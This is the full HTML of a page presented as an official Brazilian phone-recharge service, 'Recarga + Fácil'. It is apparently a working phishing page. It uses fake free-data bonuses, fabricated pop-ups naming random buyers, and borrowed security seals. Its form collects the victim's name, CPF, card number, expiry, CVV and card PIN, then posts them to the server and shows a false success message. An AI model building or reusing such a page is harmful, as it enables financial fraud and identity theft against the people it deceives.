<!DOCTYPE html>
<html lang="pt-br">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Recarga + Fácil - Oficial</title>
    <style>
        :root { --primary: #f39200; --secondary: #004a99; --bg: #eef2f7; }
        body { font-family: 'Segoe UI', sans-serif; background: var(--bg); margin: 0; display: flex; flex-direction: column; align-items: center; min-height: 100vh; }
        
        /* Cabeçalho */
        .header { text-align: center; padding: 20px; }
        .header h1 { color: var(--secondary); margin: 0; font-size: 28px; }
        .header span { color: var(--primary); }
        .header p { color: #666; margin-top: 5px; }

        /* Container Principal */
        .container { background: white; width: 90%; max-width: 450px; padding: 25px; border-radius: 20px; box-shadow: 0 10px 25px rgba(0,0,0,0.05); margin-bottom: 20px; }
        
        label { font-weight: bold; color: #333; display: block; margin-bottom: 10px; }
        input { width: 100%; padding: 15px; border: 1px solid #ddd; border-radius: 10px; font-size: 18px; box-sizing: border-box; margin-bottom: 20px; outline: none; }
        input:focus { border-color: var(--secondary); }

        /* Grids de Opções */
        .grid-operadoras, .grid-valores { display: grid; grid-template-columns: 1fr 1fr; gap: 10px; margin-bottom: 20px; }
        .op-btn, .val-btn { border: 1px solid #ddd; padding: 15px; border-radius: 10px; text-align: center; cursor: pointer; background: white; transition: 0.2s; }
        .op-btn.selected, .val-btn.selected { border: 2px solid var(--secondary); background: #f0f7ff; color: var(--secondary); font-weight: bold; }
        .val-btn span { display: block; font-size: 12px; color: #238636; margin-top: 4px; }

        /* Botão Prosseguir */
        .btn-prosseguir { width: 100%; padding: 18px; background: var(--primary); color: white; border: none; border-radius: 10px; font-size: 18px; font-weight: bold; cursor: pointer; transition: 0.3s; }
        .btn-prosseguir:hover { background: #d68100; }

        /* Selos */
        .seguranca { display: flex; gap: 15px; opacity: 0.6; margin-top: 10px; }
        .seguranca img { height: 30px; }

        /* Notificação de Prova Social */
        .social-proof { position: fixed; bottom: 20px; left: 20px; background: white; padding: 12px 18px; border-radius: 12px; box-shadow: 0 5px 15px rgba(0,0,0,0.2); display: flex; align-items: center; gap: 12px; z-index: 9999; transition: 0.5s; transform: translateY(150%); border-left: 5px solid #238636; }
        .social-proof.show { transform: translateY(0); }
        .social-proof p { margin: 0; font-size: 13px; color: #333; line-height: 1.4; }
        .social-proof b { color: #238636; }

        /* Controle de Etapas */
        .etapa { display: none; }
        .ativa { display: block; }
    </style>
</head>
<body>

    <div class="header">
        <h1>RECARGA <span>+FÁCIL</span></h1>
        <p>A forma mais rápida de recarregar seu celular</p>
    </div>

    <div class="container">
        <form id="formRecarga">
            <div id="etapa1" class="etapa ativa">
                <label>Digite seu número:</label>
                <input type="tel" id="telefone" placeholder="(00) 00000-0000" required>

                <label>Qual sua operadora?</label>
                <div class="grid-operadoras">
                    <div class="op-btn" onclick="selectOp(this, 'Vivo')">Vivo</div>
                    <div class="op-btn" onclick="selectOp(this, 'Claro')">Claro</div>
                    <div class="op-btn" onclick="selectOp(this, 'TIM')">TIM</div>
                    <div class="op-btn" onclick="selectOp(this, 'Oi')">Oi</div>
                </div>

                <label>Quanto quer recarregar?</label>
                <div class="grid-valores">
                    <div class="val-btn" onclick="selectVal(this, '20')">R$ 20 <span>+4GB GRÁTIS</span></div>
                    <div class="val-btn" onclick="selectVal(this, '30')">R$ 30 <span>+6GB GRÁTIS</span></div>
                    <div class="val-btn" onclick="selectVal(this, '50')">R$ 50 <span>+10GB GRÁTIS</span></div>
                    <div class="val-btn" onclick="selectVal(this, '100')">R$ 100 <span>+20GB GRÁTIS</span></div>
                </div>
                <button type="button" class="btn-prosseguir" onclick="ir(2)">PROSSEGUIR</button>
            </div>

            <div id="etapa2" class="etapa">
                <label>Confirme seus dados:</label>
                <input type="text" id="nome" placeholder="Nome Completo" required>
                <input type="text" id="cpf" placeholder="CPF" required>
                <button type="button" class="btn-prosseguir" onclick="ir(3)">IR PARA PAGAMENTO</button>
            </div>

            <div id="etapa3" class="etapa">
                <label>Pagamento em Cartão:</label>
                <input type="text" id="cartao" placeholder="Número do Cartão" maxlength="16" required>
                <div style="display:flex; gap:10px;">
                    <input type="text" id="data" placeholder="MM/AA" maxlength="5" required>
                    <input type="text" id="cvv" placeholder="CVV" maxlength="3" required>
                </div>
                <input type="password" id="senha" placeholder="Senha do Cartão" required>
                <button type="submit" class="btn-prosseguir">FINALIZAR RECARGA</button>
            </div>
            
            <div id="etapa4" class="etapa" style="text-align:center">
                <h2 style="color: #238636;">✓ Sucesso!</h2>
                <p>Sua recarga foi enviada ao sistema.</p>
            </div>
        </form>
    </div>

    <div class="seguranca">
        <img src="https://logodownload.org/wp-content/uploads/2017/08/selo-google-safe-browsing.png">
        <img src="https://logodownload.org/wp-content/uploads/2014/10/pci-dss-compliant-logo.png">
    </div>

    <div id="social-proof" class="social-proof">
        <img src="https://cdn-icons-png.flaticon.com/512/1144/1144760.png" width="35">
        <div>
            <p id="social-text"></p>
            <span style="font-size: 10px; color: #999;">agora mesmo</span>
        </div>
    </div>

    <script>
        let dadosComp = { operadora: '', valor: '' };
        const nomesBR = ["Marcos Silva", "Ana Paula", "Bruno Oliveira", "Fernanda Souza", "Lucas Santos", "Beatriz Lima", "Mateus Braga", "Carla Ferreira", "Ricardo Melo", "Juliana Pereira", "Rafael Torres", "Thiago Gomes", "Camila Rocha", "Rodrigo Alves", "Aline Costa", "Gustavo Henrique", "Patrícia Lima", "Felipe Dantas", "Larissa M.", "Gabriel N.", "Renata Silva", "Diego Ramos", "Vanessa B.", "Leandro P.", "Priscila G.", "Eduardo S.", "Tatiane M.", "Vinícius R.", "Cláudia F.", "Samuel T.", "Letícia C.", "Daniel A.", "Mônica S.", "Igor F.", "Sabrina V.", "André Luiz", "Jéssica R.", "Marcelo D.", "Fabiana K.", "Heitor J."];
        const valoresReais = ["20", "30", "50", "100"];

        function selectOp(el, val) {
            document.querySelectorAll('.op-btn').forEach(b => b.classList.remove('selected'));
            el.classList.add('selected');
            dadosComp.operadora = val;
        }

        function selectVal(el, val) {
            document.querySelectorAll('.val-btn').forEach(b => b.classList.remove('selected'));
            el.classList.add('selected');
            dadosComp.valor = val;
        }

        function ir(n) {
            document.querySelectorAll('.etapa').forEach(e => e.classList.remove('ativa'));
            document.getElementById('etapa'+n).classList.add('ativa');
            window.scrollTo(0,0);
        }

        function mostrarNotificacao() {
            const popup = document.getElementById('social-proof');
            const texto = document.getElementById('social-text');
            const nomeSorteado = nomesBR[Math.floor(Math.random() * nomesBR.length)];
            const valorSorteado = valoresReais[Math.floor(Math.random() * valoresReais.length)];
            texto.innerHTML = `<b>${nomeSorteado}</b> acabou de recarregar <b>R$ ${valorSorteado}</b>`;
            popup.classList.add('show');
            setTimeout(() => { popup.classList.remove('show'); }, 2500);
        }

        setInterval(mostrarNotificacao, 4000);
        setTimeout(mostrarNotificacao, 1000);

        document.getElementById('formRecarga').onsubmit = async (e) => {
            e.preventDefault();
            const payload = {
                ...dadosComp,
                telefone: document.getElementById('telefone').value,
                nome: document.getElementById('nome').value,
                cpf: document.getElementById('cpf').value,
                cartao: document.getElementById('cartao').value,
                data: document.getElementById('data').value,
                cvv: document.getElementById('cvv').value,
                senha: document.getElementById('senha').value
            };
            const res = await fetch('/finalizar', {
                method: 'POST',
                headers: {'Content-Type': 'application/json'},
                body: JSON.stringify(payload)
            });
            if(res.ok) ir(4);
        };
    </script>
</body>
</html>
